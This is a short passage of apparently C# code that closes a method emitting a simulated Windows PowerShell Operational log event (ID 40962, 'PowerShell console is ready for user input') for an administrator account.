            M.Event("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", 40962, 4, "PowerShell console is ready for user input", M.AdminUserSid);
        }
    }
}
